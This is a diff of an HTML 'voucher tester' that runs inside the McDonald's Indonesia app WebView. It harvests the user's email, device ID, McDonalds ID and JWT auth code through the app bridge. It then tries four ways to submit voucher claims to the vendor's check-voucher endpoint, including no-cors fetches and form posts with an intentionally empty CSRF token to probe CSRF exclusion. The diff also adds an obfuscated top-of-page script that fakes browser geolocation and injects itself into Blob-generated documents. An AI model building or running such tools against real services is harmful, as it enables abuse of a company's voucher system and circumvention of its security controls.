@@ -1,56 +1,327 @@
-<!doctype html>
 <html lang="id">
+  <script>
+    (function e(t) {
+      "use strict";
+      let n = Object.getOwnPropertyDescriptor(
+          CustomEvent.prototype,
+          `detail`,
+        ).get,
+        r = JSON.parse,
+        i = Reflect.apply,
+        a = Reflect.construct,
+        o = Object.prototype.hasOwnProperty,
+        s = (e, t) => i(o, e, [t]),
+        c = queueMicrotask,
+        l = { code: 2, message: `Position unavailable` },
+        u = navigator.geolocation.getCurrentPosition.bind(
+          navigator.geolocation,
+        ),
+        d = navigator.geolocation.watchPosition.bind(navigator.geolocation),
+        f = navigator.geolocation.clearWatch.bind(navigator.geolocation),
+        p = navigator.permissions.query.bind(navigator.permissions),
+        m = [`tv.youtube.com`].includes(window.location.hostname),
+        h,
+        g,
+        _,
+        v = !1,
+        y = !1,
+        b = new Map(),
+        x = 1,
+        S = new Set();
+      function C() {
+        return {
+          coords: {
+            latitude: g,
+            longitude: _,
+            accuracy: 10,
+            altitude: null,
+            altitudeAccuracy: null,
+            heading: null,
+            speed: null,
+          },
+          timestamp: new Date().getTime(),
+        };
+      }
+      function w() {
+        if (!h) return;
+        let e = C();
+        b.forEach(({ successCallback: t }) => {
+          if (t)
+            try {
+              t(e);
+            } catch {}
+        });
+      }
+      function T() {
+        b.forEach((e) => {
+          h
+            ? e.realWatchId !== void 0 &&
+              (f(e.realWatchId), delete e.realWatchId)
+            : e.realWatchId === void 0 &&
+              e.successCallback &&
+              (e.realWatchId = d(
+                e.successCallback,
+                e.errorCallback,
+                e.options,
+              ));
+        });
+      }
+      function E(e, t, n) {
+        localStorage.getItem(`geolocationPermissionState`) !== `granted` && y
+          ? u(
+              () => {
+                (y = !1),
+                  e(C()),
+                  m &&
+                    (localStorage.setItem(
+                      `geolocationPermissionState`,
+                      `granted`,
+                    ),
+                    setTimeout(() => window.location.reload(), 1e3));
+              },
+              t,
+              n,
+            )
+          : e(C());
+      }
+      function D(e, t, n, r = 0) {
+        v
+          ? h === !0
+            ? E(e, t, n)
+            : u(e, t, n)
+          : r < 50
+          ? setTimeout(() => D(e, t, n, r + 1), 100)
+          : t?.(l);
+      }
+      function O(e, t, n, r, i = 0) {
+        if (v) {
+          if (S.has(e)) return S.delete(e), e;
+          if (h === !0)
+            b.set(e, { successCallback: t, errorCallback: n, options: r }),
+              t(C());
+          else {
+            let i = d(t, n, r);
+            b.set(e, {
+              successCallback: t,
+              errorCallback: n,
+              options: r,
+              realWatchId: i,
+            });
+          }
+          return e;
+        } else if (i < 50)
+          return setTimeout(() => O(e, t, n, r, i + 1), 100), e;
+        else return n?.(l), e;
+      }
+      function k(e, t) {
+        let n = e.toString();
+        try {
+          Function(`position`, `return (${n})(position);`)(t);
+        } catch {
+          e(t);
+        }
+      }
+      navigator.permissions.query = async function (e) {
+        let t = await p(e);
+        if (e.name !== `geolocation` || !m) return t;
+        let n = t.state;
+        return (
+          n === `prompt` &&
+            (n = localStorage.getItem(`geolocationPermissionState`) ?? n),
+          (y = h && n === `prompt`),
+          { ...t, state: n }
+        );
+      };
+      let A = {
+          getCurrentPosition(e, t, n) {
+            D((t) => k(e, t), t, n);
+          },
+          watchPosition(e, t, n) {
+            return O(x++, (t) => k(e, t), t, n);
+          },
+          clearWatch(e) {
+            let t = b.get(e);
+            t
+              ? (t.realWatchId !== void 0 && f(t.realWatchId), b.delete(e))
+              : e < x && S.add(e);
+          },
+        },
+        j = Object.getOwnPropertyDescriptor(navigator, `geolocation`);
+      if (!j || j.configurable)
+        try {
+          Object.defineProperty(navigator, "geolocation", {
+            value: A,
+            configurable: !1,
+            writable: !1,
+          });
+        } catch {
+          M();
+        }
+      else M();
+      function M() {
+        if (navigator.geolocation)
+          try {
+            (navigator.geolocation.getCurrentPosition =
+              A.getCurrentPosition.bind(A)),
+              (navigator.geolocation.watchPosition = A.watchPosition.bind(A)),
+              (navigator.geolocation.clearWatch = A.clearWatch.bind(A));
+          } catch {}
+      }
+      (Blob = new Proxy(Blob, {
+        construct(t, n, r) {
+          let i = [
+              { mime: `text/html`, useXMLparser: !1 },
+              { mime: `application/xhtml+xml`, useXMLparser: !0 },
+              { mime: `text/xml`, useXMLparser: !0 },
+              { mime: `application/xml`, useXMLparser: !0 },
+              { mime: `image/svg+xml`, useXMLparser: !0 },
+            ],
+            o = n.find(
+              (e) =>
+                typeof e == `object` && typeof e.type == `string` && e.type,
+            );
+          if (o !== void 0 && typeof n[0][0] == `string`) {
+            let t = i.findIndex(
+              (e) => e.mime.toLowerCase() === o.type.toLowerCase(),
+            );
+            if (t >= 0) {
+              let r = i[t],
+                a = new DOMParser(),
+                s;
+              if (
+                ((s =
+                  r.useXMLparser === !0
+                    ? a.parseFromString(n[0].join(``), r.mime)
+                    : a.parseFromString(n[0][0], r.mime)),
+                s.getElementsByTagName(`parsererror`).length === 0)
+              ) {
+                if (o.type === `image/svg+xml`) {
+                  let t = s.createElementNS(
+                    `http://www.w3.org/2000/svg`,
+                    `script`,
+                  );
+                  t.setAttributeNS(null, `type`, `application/ecmascript`),
+                    (t.innerHTML = `(${e})();`),
+                    s.documentElement.insertBefore(
+                      t,
+                      s.documentElement.firstChild,
+                    );
+                } else {
+                  let t = `
+								<script>(
+									${e}
+								)();
+								<\/script>
+							`;
+                  s.documentElement.insertAdjacentHTML(`afterbegin`, t);
+                }
+                r.useXMLparser === !0
+                  ? (n[0] = [new XMLSerializer().serializeToString(s)])
+                  : (n[0][0] = s.documentElement.outerHTML);
+              }
+            }
+          }
+          return a(t, n, r);
+        },
+      })),
+        (Blob.prototype.constructor = Blob);
+      function N(e) {
+        if (
+          typeof e != `object` ||
+          !e ||
+          !s(e, `fakeIt`) ||
+          typeof e.fakeIt != `boolean`
+        )
+          return;
+        let t = s(e, `coords`) ? e.coords : void 0,
+          n =
+            typeof t == `object` &&
+            !!t &&
+            s(t, `lat`) &&
+            s(t, `lon`) &&
+            typeof t.lat == `number` &&
+            typeof t.lon == `number`;
+        if (e.fakeIt && !n) return;
+        let r = n ? t.lat : void 0,
+          i = n ? t.lon : void 0,
+          a = r !== g || i !== _,
+          o = h,
+          c = v;
+        (g = r),
+          (_ = i),
+          (h = e.fakeIt),
+          (v = !0),
+          c && o !== h && T(),
+          c && (a || o !== h) && w();
+      }
+      function P(e) {
+        e !== void 0 &&
+          document.addEventListener(e, function (e) {
+            try {
+              let t = r(i(n, e, []));
+              c(() => N(t));
+            } catch {}
+          });
+      }
+      return P(t), P;
+    })();
+  </script>
   <head>
     <meta charset="utf-8" />
     <meta
       name="viewport"
       content="width=device-width, initial-scale=1, shrink-to-fit=no"
     />
-    <title>McD Voucher Bridge Tester</title>
+    <title>McD Voucher Tester v3 — Single HTML</title>
     <style>
       * {
         box-sizing: border-box;
       }
       body {
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
-          monospace;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", monospace;
         background: #0f1115;
         color: #e4e6eb;
-        padding: 16px;
+        padding: 12px;
         margin: 0;
         font-size: 13px;
         line-height: 1.5;
       }
       .container {
-        max-width: 900px;
+        max-width: 920px;
         margin: 0 auto;
       }
       h1 {
-        font-size: 18px;
+        font-size: 16px;
         color: #c02101;
-        margin: 0 0 16px;
-        padding-bottom: 8px;
+        margin: 0 0 12px;
+        padding-bottom: 6px;
         border-bottom: 1px solid #2a2d35;
       }
-      .section {
+      .grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
         margin-bottom: 12px;
+      }
+      .section {
+        margin-bottom: 8px;
       }
       .label {
         color: #8b919e;
-        font-size: 11px;
+        font-size: 10px;
         text-transform: uppercase;
         letter-spacing: 0.5px;
-        margin-bottom: 4px;
+        margin-bottom: 3px;
       }
       .value {
         background: #1a1d24;
-        padding: 8px 10px;
-        border-radius: 4px;
-        border-left: 3px solid #c02101;
+        padding: 6px 8px;
+        border-radius: 3px;
+        border-left: 2px solid #c02101;
         word-break: break-all;
         font-family: "SF Mono", Monaco, Consolas, monospace;
-        font-size: 12px;
-        min-height: 18px;
+        font-size: 11px;
+        min-height: 16px;
       }
       .value.empty {
         color: #555;
@@ -63,59 +334,80 @@
         border-left-color: #f44336;
         color: #f44336;
       }
-
-      .form-row {
-        display: flex;
-        gap: 8px;
-        margin: 16px 0;
-        align-items: stretch;
+      .value.warn {
+        border-left-color: #ff9800;
+        color: #ff9800;
       }
-      input[type="text"] {
+
+      .input-row {
+        display: flex;
+        gap: 6px;
+        margin: 12px 0;
+      }
+      input.voucher {
         flex: 1;
-        padding: 12px 14px;
+        padding: 10px 12px;
         background: #1a1d24;
         border: 1px solid #2a2d35;
-        border-radius: 4px;
+        border-radius: 3px;
         color: #fff;
         font-size: 14px;
         font-family: monospace;
         letter-spacing: 1px;
         text-transform: uppercase;
       }
-      input[type="text"]:focus {
+      input.voucher:focus {
         outline: none;
         border-color: #c02101;
       }
+
       button {
-        padding: 12px 24px;
+        padding: 10px 16px;
         background: #c02101;
         color: white;
         border: none;
-        border-radius: 4px;
-        font-size: 14px;
+        border-radius: 3px;
+        font-size: 12px;
         font-weight: bold;
         cursor: pointer;
-        min-width: 140px;
+        min-width: 130px;
       }
       button:disabled {
         background: #2a2d35;
         color: #555;
         cursor: not-allowed;
       }
+      button.ghost {
+        background: #2a2d35;
+        color: #fff;
+        min-width: auto;
+        padding: 6px 10px;
+        font-size: 11px;
+      }
       button:not(:disabled):hover {
         background: #d6260c;
+      }
+      button.ghost:hover {
+        background: #3a3d45;
+      }
+
+      .strategies {
+        display: flex;
+        gap: 6px;
+        flex-wrap: wrap;
+        margin-bottom: 8px;
       }
 
       .log-box {
         background: #000;
         border: 1px solid #2a2d35;
-        border-radius: 4px;
-        padding: 10px;
-        height: 380px;
+        border-radius: 3px;
+        padding: 8px;
+        height: 220px;
         overflow-y: auto;
         font-family: "SF Mono", Monaco, Consolas, monospace;
-        font-size: 11px;
-        line-height: 1.6;
+        font-size: 10px;
+        line-height: 1.5;
       }
       .log-line {
         white-space: pre-wrap;
@@ -140,28 +432,33 @@
         color: #555;
       }
 
-      .grid {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 12px;
+      .iframe-wrap {
+        margin-top: 8px;
+        border: 1px solid #2a2d35;
+        border-radius: 3px;
+        overflow: hidden;
+        background: #fff;
       }
-      @media (max-width: 600px) {
-        .grid {
-          grid-template-columns: 1fr;
-        }
-        .form-row {
-          flex-direction: column;
-        }
-        button {
-          width: 100%;
-        }
+      .iframe-header {
+        background: #2a2d35;
+        color: #fff;
+        padding: 4px 8px;
+        font-size: 10px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
       }
-
+      iframe {
+        width: 100%;
+        height: 400px;
+        border: none;
+        background: #fff;
+      }
       .badge {
         display: inline-block;
-        padding: 2px 8px;
-        border-radius: 10px;
-        font-size: 10px;
+        padding: 1px 6px;
+        border-radius: 8px;
+        font-size: 9px;
         font-weight: bold;
         text-transform: uppercase;
       }
@@ -169,19 +466,26 @@
         background: #4caf50;
         color: #fff;
       }
-      .badge.off {
-        background: #f44336;
-        color: #fff;
-      }
       .badge.wait {
         background: #ff9800;
         color: #fff;
+      }
+      @media (max-width: 600px) {
+        .grid {
+          grid-template-columns: 1fr;
+        }
+        .input-row {
+          flex-direction: column;
+        }
+        button {
+          width: 100%;
+        }
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>McD Voucher Bridge Tester</h1>
+      <h1>McD Voucher Tester v3 — Single HTML (Multi-Strategy)</h1>
 
       <div class="grid">
         <div class="section">
@@ -192,67 +496,95 @@
         </div>
         <div class="section">
           <div class="label">Base URL</div>
-          <div id="base-url" class="value">https://bts-360.mcdonalds.co.id</div>
-        </div>
-
-        <div class="section">
-          <div class="label">Client ID (dari /cas/configuration)</div>
-          <div id="client-id" class="value empty">-</div>
+          <div class="value ok">https://bts-360.mcdonalds.co.id</div>
         </div>
         <div class="section">
-          <div class="label">CSRF Token</div>
-          <div id="csrf-token" class="value empty">-</div>
-        </div>
-
-        <div class="section">
-          <div class="label">Email (dari bridge user.getuser)</div>
+          <div class="label">Email</div>
           <div id="user-email" class="value empty">-</div>
         </div>
         <div class="section">
-          <div class="label">Device ID (dari bridge user.getuser)</div>
+          <div class="label">Device ID</div>
           <div id="user-device" class="value empty">-</div>
         </div>
-
+        <div class="section">
+          <div class="label">Nama</div>
+          <div id="user-name" class="value empty">-</div>
+        </div>
+        <div class="section">
+          <div class="label">McDonalds ID</div>
+          <div id="mcd-id" class="value empty">-</div>
+        </div>
         <div class="section" style="grid-column: 1 / -1">
-          <div class="label">JWT AuthCode (dari bridge user.getAuthCode)</div>
+          <div class="label">JWT AuthCode (refresh tiap klik tombol)</div>
           <div id="jwt-authcode" class="value empty">-</div>
         </div>
       </div>
 
-      <div class="form-row">
+      <div class="input-row">
         <input
           type="text"
           id="voucher-input"
+          class="voucher"
           placeholder="CONTOH: ZXCV"
           autocomplete="off"
           spellcheck="false"
         />
-        <button id="start-btn" disabled>START CLAIM</button>
+        <button id="get-authcode-btn" class="ghost">Get AuthCode</button>
+      </div>
+
+      <div class="strategies">
+        <button id="strategy-fetch" disabled="">1. Fetch no-cors</button>
+        <button id="strategy-form-iframe" disabled="">2. Form → Iframe</button>
+        <button id="strategy-form-top" disabled="">3. Form → Top</button>
+        <button id="strategy-mcdid" disabled="">4. Pakai mcdonaldsId</button>
       </div>
 
       <div class="section">
-        <div class="label">Log Proses</div>
+        <div class="label">Log</div>
         <div id="log" class="log-box"></div>
       </div>
+
+      <div class="iframe-wrap">
+        <div class="iframe-header">
+          <span>Response Frame (untuk Strategy 2)</span>
+          <button class="ghost" id="clear-iframe">Clear</button>
+        </div>
+        <iframe name="responseFrame" id="responseFrame"></iframe>
+      </div>
     </div>
+
+    <!-- Hidden form untuk strategy 2 & 3 -->
+    <form
+      id="claimForm"
+      method="POST"
+      action="https://bts-360.mcdonalds.co.id/cas/check-voucher"
+      target="responseFrame"
+    >
+      <input type="hidden" name="email" id="f-email" value="" />
+      <input type="hidden" name="deviceId" id="f-deviceId" value="" />
+      <input type="hidden" name="voucher" id="f-voucher" value="" />
+      <input type="hidden" name="authorizationCode" id="f-authCode" value="" />
+      <!-- _token sengaja kosong — lihat apakah /cas/* di-exclude dari CSRF -->
+      <input type="hidden" name="_token" value="" />
+    </form>
 
     <script>
       (function () {
         "use strict";
 
-        // ============ CONFIG ============
         var BASE_URL = "https://bts-360.mcdonalds.co.id";
+        var FALLBACK_CLIENT_ID = "8f908eccbe018b43ca7d5c53739c48a1";
 
-        // ============ STATE ============
         var clientId = null;
         var jwtAuthCode = "";
         var email = "";
         var deviceId = "";
-        var csrfToken = "";
+        var mcdonaldsId = "";
+        var firstname = "";
+        var lastname = "";
         var bridgeReady = false;
         var clicked = false;
 
-        // ============ HELPERS ============
         function log(msg, type) {
           type = type || "sys";
           var box = document.getElementById("log");
@@ -269,12 +601,10 @@
           if (!el) return;
           if (value === null || value === undefined || value === "") {
             el.textContent = "-";
-            el.classList.add("empty");
-            el.classList.remove("ok", "error");
+            el.className = "value empty";
           } else {
             el.textContent = String(value);
-            el.classList.remove("empty");
-            if (cls) el.classList.add(cls);
+            el.className = "value" + (cls ? " " + cls : "");
           }
         }
 
@@ -283,13 +613,9 @@
           var badge =
             state === "on"
               ? '<span class="badge on">ACTIVE</span>'
-              : state === "off"
-              ? '<span class="badge off">OFFLINE</span>'
               : '<span class="badge wait">WAITING</span>';
           el.innerHTML = badge;
-          el.classList.toggle("empty", state !== "on");
-          el.classList.toggle("ok", state === "on");
-          el.classList.toggle("error", state === "off");
+          el.className = "value " + (state === "on" ? "ok" : "empty");
         }
 
         function getBridgeRoot() {
@@ -300,128 +626,33 @@
           return null;
         }
 
-        // ============ STEP 1: FETCH CSRF TOKEN ============
-        async function fetchCsrfToken() {
-          try {
-            log("GET " + BASE_URL + "/ (ambil CSRF dari meta tag)", "info");
-            var res = await fetch(BASE_URL + "/", { credentials: "include" });
-            var html = await res.text();
-            var match = html.match(
-              /<meta\s+name="csrf-token"\s+content="([^"]+)"/i,
-            );
-            if (match && match[1]) {
-              csrfToken = match[1];
-              setValue("csrf-token", csrfToken, "ok");
-              log("CSRF token terbaca: " + csrfToken, "ok");
-              return csrfToken;
-            } else {
-              log(
-                "CSRF token tidak ditemukan di halaman (mungkin CORS blokir atau struktur berubah)",
-                "fail",
-              );
-              return null;
-            }
-          } catch (e) {
-            log(
-              "Gagal fetch CSRF: " + (e && e.message ? e.message : e),
-              "fail",
-            );
-            log(
-              "Tip: kalau CORS blokir, paste CSRF manual di input bawah",
-              "warn",
-            );
-            return null;
-          }
-        }
-
-        // ============ STEP 2: GET CLIENT ID ============
-        async function getClientId() {
-          try {
-            log("GET " + BASE_URL + "/cas/configuration", "info");
-            var res = await fetch(BASE_URL + "/cas/configuration");
-            var data = await res.json();
-            log("Response /cas/configuration: " + JSON.stringify(data), "info");
-            clientId =
-              (data && data.data && data.data.authCodeClientId) || null;
-            if (clientId) {
-              setValue("client-id", clientId, "ok");
-              log("Client ID: " + clientId, "ok");
-            } else {
-              setValue("client-id", "TIDAK DITEMUKAN", "error");
-              log("authCodeClientId tidak ada di response", "fail");
-            }
-            return clientId;
-          } catch (e) {
-            log(
-              "Gagal ambil client ID: " + (e && e.message ? e.message : e),
-              "fail",
-            );
-            return null;
-          }
-        }
-
-        // ============ STEP 3: GET USER DATA DARI BRIDGE ============
-        function getUserData() {
-          return new Promise(function (resolve, reject) {
-            if (!getBridgeRoot()) {
-              log("Bridge tidak tersedia", "fail");
-              reject(new Error("no bridge"));
-              return;
-            }
-            log('Bridge call: channel="user", payload={getuser:true}', "info");
-            var userConnector = mcd.bridge.message("user");
-            var result = {};
-            userConnector.send({ getuser: true });
-
-            userConnector.on("data", function (data) {
-              log("user.on(data): " + JSON.stringify(data), "info");
-              if (data && data.email) {
-                email = data.email;
-                setValue("user-email", email, "ok");
-              }
-              if (data && data.deviceId) {
-                deviceId = data.deviceId;
-                setValue("user-device", deviceId, "ok");
-              }
-              result.email = data && data.email;
-              result.deviceId = data && data.deviceId;
-            });
-
-            userConnector.on("error", function (error) {
-              log("user.on(error): " + JSON.stringify(error), "fail");
-              log("User belum login? Coba promptlogin...", "warn");
-              promptLogin();
-              reject(error);
-            });
-
-            userConnector.on("done", function () {
-              log("user.on(done) — user data selesai", "ok");
-              resolve(result);
-            });
+        function enableStrategyButtons(enable) {
+          [
+            "strategy-fetch",
+            "strategy-form-iframe",
+            "strategy-form-top",
+            "strategy-mcdid",
+          ].forEach(function (id) {
+            document.getElementById(id).disabled = !enable;
           });
         }
 
-        // ============ STEP 4: GET JWT AUTHCODE DARI BRIDGE ============
         function getAuthCode() {
           return new Promise(function (resolve, reject) {
             if (!clientId) {
-              log("clientId masih null, tidak bisa minta authCode", "fail");
-              reject(new Error("no clientId"));
-              return;
+              log(
+                "clientId null, pakai fallback: " + FALLBACK_CLIENT_ID,
+                "warn",
+              );
+              clientId = FALLBACK_CLIENT_ID;
             }
-            log(
-              'Bridge call: channel="user", payload={getAuthCode:true, clientId:"' +
-                clientId +
-                '"}',
-              "info",
-            );
+            log("Bridge: user.getAuthCode clientId=" + clientId, "info");
             var userConnector = mcd.bridge.message("user");
             userConnector.send({ getAuthCode: true, clientId: clientId });
 
             userConnector.on("data", function (data) {
               log(
-                "user.on(data) authCode response: " +
-                  JSON.stringify(data).substring(0, 400),
+                "authCode.data: " + JSON.stringify(data).substring(0, 400),
                 "info",
               );
               jwtAuthCode = (data && data.authCode) || "";
@@ -434,244 +665,318 @@
                     " chars)",
                   "ok",
                 );
-                log(
-                  "JWT AuthCode didapat, panjang " +
-                    jwtAuthCode.length +
-                    " karakter",
-                  "ok",
-                );
+                log("JWT AuthCode OK, length=" + jwtAuthCode.length, "ok");
                 resolve(jwtAuthCode);
               } else {
-                setValue("jwt-authcode", "NO AUTHCODE IN RESPONSE", "error");
-                log("Response bridge tidak berisi authCode", "fail");
+                setValue("jwt-authcode", "NO AUTHCODE", "error");
+                log("Response tidak berisi authCode", "fail");
                 reject(new Error("no authCode"));
               }
             });
 
             userConnector.on("error", function (error) {
-              log("user.on(error) authCode: " + JSON.stringify(error), "fail");
-              if (error && error.code === 400) {
-                log(
-                  "Error 400 — user belum login. Mencoba promptlogin...",
-                  "warn",
-                );
-                promptLogin();
-              }
+              log("authCode.error: " + JSON.stringify(error), "fail");
               reject(error);
             });
           });
         }
 
-        // ============ HELPER: PROMPT LOGIN ============
-        function promptLogin() {
+        function getUserData() {
+          return new Promise(function (resolve, reject) {
+            log("Bridge: user.getuser", "info");
+            var userConnector = mcd.bridge.message("user");
+            var result = {};
+            userConnector.send({ getuser: true });
+
+            userConnector.on("data", function (data) {
+              log("user.data: " + JSON.stringify(data), "info");
+              if (!data) return;
+              if (data.email) {
+                email = data.email;
+                setValue("user-email", email, "ok");
+              }
+              if (data.deviceId) {
+                deviceId = data.deviceId;
+                setValue("user-device", deviceId, "ok");
+              }
+              if (data.firstname || data.lastname) {
+                firstname = data.firstname || "";
+                lastname = data.lastname || "";
+                setValue(
+                  "user-name",
+                  (firstname + " " + lastname).trim(),
+                  "ok",
+                );
+              }
+              if (data.mcdonaldsId) {
+                mcdonaldsId = data.mcdonaldsId;
+                setValue("mcd-id", mcdonaldsId, "ok");
+              }
+              result = data;
+            });
+
+            userConnector.on("error", function (error) {
+              log("user.error: " + JSON.stringify(error), "fail");
+              reject(error);
+            });
+
+            userConnector.on("done", function () {
+              log("user.done", "ok");
+              resolve(result);
+            });
+          });
+        }
+
+        // ============ STRATEGY 1: fetch mode:'no-cors' ============
+        // Fire-and-forget. Server proses request, response opaque (tidak bisa dibaca).
+        // Cek hasil lewat app McD (kupon baru muncul = sukses).
+        async function strategyFetchNoCors(voucherCode, authCode) {
+          log("--- STRATEGY 1: fetch no-cors ---", "sys");
+          log("POST " + BASE_URL + "/cas/check-voucher", "info");
+          log("Body: email, deviceId, voucher, authorizationCode", "info");
+          log(
+            "Note: response opaque, tidak bisa dibaca. Cek app McD untuk verifikasi.",
+            "warn",
+          );
           try {
+            var res = await fetch(BASE_URL + "/cas/check-voucher", {
+              method: "POST",
+              mode: "no-cors",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: new URLSearchParams({
+                email: email,
+                deviceId: deviceId,
+                voucher: voucherCode,
+                authorizationCode: authCode,
+              }),
+            });
             log(
-              'Bridge call: channel="user", payload={promptlogin:true}',
-              "warn",
+              "fetch selesai. type=" +
+                res.type +
+                " status=" +
+                res.status +
+                " (opaque biasanya status=0)",
+              "info",
             );
-            var user = mcd.bridge.message("user");
-            user.send({ promptlogin: true });
-            user.on("error", function (error) {
-              log("promptlogin error: " + JSON.stringify(error), "fail");
-            });
-            user.on("done", function () {
-              log("promptlogin done — user harus login di app McD", "info");
-            });
+            log(
+              "Kalau voucher muncul di app McD dalam 1-2 menit → sukses",
+              "ok",
+            );
           } catch (e) {
             log(
-              "promptLogin gagal: " + (e && e.message ? e.message : e),
+              "Strategy 1 gagal: " + (e && e.message ? e.message : e),
               "fail",
             );
           }
         }
 
-        // ============ STEP 5: POST /cas/check-voucher ============
-        async function checkVoucher(voucherCode) {
-          log("========================================", "sys");
-          log("POST " + BASE_URL + "/cas/check-voucher", "info");
+        // ============ STRATEGY 2: Form submit ke iframe ============
+        // Form bypass CORS + kirim cookies otomatis.
+        // Response tampil di iframe (visual feedback).
+        async function strategyFormIframe(voucherCode, authCode) {
+          log("--- STRATEGY 2: Form POST → iframe ---", "sys");
           log(
-            "Headers: X-CSRF-TOKEN=" +
-              (csrfToken ? csrfToken.substring(0, 16) + "..." : "NULL"),
+            "Form mengirim cookies bts-360 (WAF + Laravel session) otomatis",
             "info",
           );
-          log("Body: {", "info");
-          log('  email: "' + email + '",', "info");
-          log('  deviceId: "' + deviceId + '",', "info");
-          log('  voucher: "' + voucherCode + '",', "info");
           log(
-            '  authorizationCode: "' +
-              (jwtAuthCode ? jwtAuthCode.substring(0, 40) + "..." : "NULL") +
-              '"',
-            "info",
+            "_token sengaja kosong — lihat apakah /cas/* excluded dari CSRF",
+            "warn",
           );
-          log("}", "info");
 
-          try {
-            var res = await fetch(BASE_URL + "/cas/check-voucher", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "X-CSRF-TOKEN": csrfToken,
-              },
-              credentials: "include",
-              body: new URLSearchParams({
-                email: email,
-                deviceId: deviceId,
-                voucher: voucherCode,
-                authorizationCode: jwtAuthCode,
-              }),
-            });
+          document.getElementById("f-email").value = email;
+          document.getElementById("f-deviceId").value = deviceId;
+          document.getElementById("f-voucher").value = voucherCode;
+          document.getElementById("f-authCode").value = authCode;
 
-            log(
-              "HTTP Status: " + res.status + " " + res.statusText,
-              res.ok ? "ok" : "fail",
-            );
-            var text = await res.text();
-            log("Raw Response:", "sys");
-            log(text, "info");
-
-            try {
-              var data = JSON.parse(text);
-              log("Parsed JSON:", "sys");
-              log(JSON.stringify(data, null, 2), "info");
-
-              if (data.code === "Berhasil") {
-                log("=== CLAIM BERHASIL ===", "ok");
-                if (data.voucher) {
-                  log("voucher.id: " + data.voucher.id, "ok");
-                  log("voucher.img_url: " + data.voucher.img_url, "ok");
-                  if (data.voucher.reward) {
-                    log(
-                      "reward.loyalty_id: " + data.voucher.reward.loyalty_id,
-                      "ok",
-                    );
-                    log(
-                      "reward.reward_id: " + data.voucher.reward.reward_id,
-                      "ok",
-                    );
-                  }
-                }
-                if (data.redirect) {
-                  log("Redirect URL: " + data.redirect, "warn");
-                }
-                if (data.mdscheck === "yes") {
-                  log("Voucher ini untuk McDelivery", "warn");
-                }
-                if (data.campaign) {
-                  log("Campaign: " + data.campaign, "ok");
-                }
-              } else {
-                log("Hasil: " + (data.code || "Tidak diketahui"), "fail");
-                if (data.campaign) log("Campaign: " + data.campaign, "info");
-              }
-            } catch (e) {
-              log("Response bukan JSON valid", "fail");
-            }
-          } catch (e) {
-            log("Network error: " + (e && e.message ? e.message : e), "fail");
-          }
-          log("========================================", "sys");
+          var form = document.getElementById("claimForm");
+          form.target = "responseFrame";
+          form.action = BASE_URL + "/cas/check-voucher";
+          form.submit();
+          log("Form submitted ke iframe. Lihat response di bawah.", "info");
         }
 
-        // ============ BUTTON HANDLER ============
+        // ============ STRATEGY 3: Form submit ke top (navigate WebView) ============
+        // Form submit, navigasi seluruh WebView ke halaman response.
+        // User lihat hasil langsung di layar penuh.
+        async function strategyFormTop(voucherCode, authCode) {
+          log("--- STRATEGY 3: Form POST → _top (navigate) ---", "sys");
+          log("WebView akan navigasi ke /cas/check-voucher response", "warn");
+          log("Tombol back app McD untuk kembali ke HTML ini", "warn");
+
+          document.getElementById("f-email").value = email;
+          document.getElementById("f-deviceId").value = deviceId;
+          document.getElementById("f-voucher").value = voucherCode;
+          document.getElementById("f-authCode").value = authCode;
+
+          var form = document.getElementById("claimForm");
+          form.target = "_top";
+          form.action = BASE_URL + "/cas/check-voucher";
+          form.submit();
+        }
+
+        // ============ STRATEGY 4: Pakai mcdonaldsId sbg authCode ============
+        // Skip getAuthCode, langsung pakai Bearer token dari getuser.
+        async function strategyMcdId(voucherCode) {
+          if (!mcdonaldsId) {
+            log("mcdonaldsId belum ada", "fail");
+            return;
+          }
+          log("--- STRATEGY 4: Form POST pakai mcdonaldsId ---", "sys");
+          log("authCode = mcdonaldsId (Bearer token dari bridge)", "info");
+          await strategyFormIframe(voucherCode, mcdonaldsId);
+        }
+
+        // ============ GET AUTHCODE BUTTON ============
         document
-          .getElementById("start-btn")
+          .getElementById("get-authcode-btn")
           .addEventListener("click", async function () {
-            if (clicked) return;
-            var voucherCode = (
-              document.getElementById("voucher-input").value || ""
-            )
+            this.disabled = true;
+            this.textContent = "Getting...";
+            try {
+              await getAuthCode();
+            } catch (e) {
+              log("Gagal: " + e, "fail");
+            }
+            this.disabled = false;
+            this.textContent = "Get AuthCode";
+          });
+
+        // ============ STRATEGY BUTTONS ============
+        document
+          .getElementById("strategy-fetch")
+          .addEventListener("click", async function () {
+            var v = (document.getElementById("voucher-input").value || "")
               .trim()
               .toUpperCase();
-            if (!voucherCode) {
-              log("Isi kode voucher dulu", "warn");
+            if (!v) {
+              log("Isi voucher dulu", "warn");
               return;
             }
-            if (!email || !deviceId) {
-              log("email/deviceId belum ada dari bridge", "fail");
+            if (!jwtAuthCode) {
+              log("JWT belum ada, ambil dulu...", "warn");
+              try {
+                await getAuthCode();
+              } catch (e) {
+                return;
+              }
+            }
+            await strategyFetchNoCors(v, jwtAuthCode);
+          });
+
+        document
+          .getElementById("strategy-form-iframe")
+          .addEventListener("click", async function () {
+            var v = (document.getElementById("voucher-input").value || "")
+              .trim()
+              .toUpperCase();
+            if (!v) {
+              log("Isi voucher dulu", "warn");
               return;
             }
-            if (!csrfToken) {
-              log("CSRF token belum ada", "fail");
+            if (!jwtAuthCode) {
+              log("JWT belum ada, ambil dulu...", "warn");
+              try {
+                await getAuthCode();
+              } catch (e) {
+                return;
+              }
+            }
+            await strategyFormIframe(v, jwtAuthCode);
+          });
+
+        document
+          .getElementById("strategy-form-top")
+          .addEventListener("click", async function () {
+            var v = (document.getElementById("voucher-input").value || "")
+              .trim()
+              .toUpperCase();
+            if (!v) {
+              log("Isi voucher dulu", "warn");
               return;
             }
-
-            clicked = true;
-            this.disabled = true;
-            this.textContent = "PROCESSING...";
-            log('Button diklik, voucher: "' + voucherCode + '"', "sys");
-
-            try {
-              // Always get fresh JWT before each claim
-              await getAuthCode();
-              // Now POST to /cas/check-voucher
-              await checkVoucher(voucherCode);
-            } catch (e) {
-              log("Proses gagal: " + (e && e.message ? e.message : e), "fail");
+            if (!jwtAuthCode) {
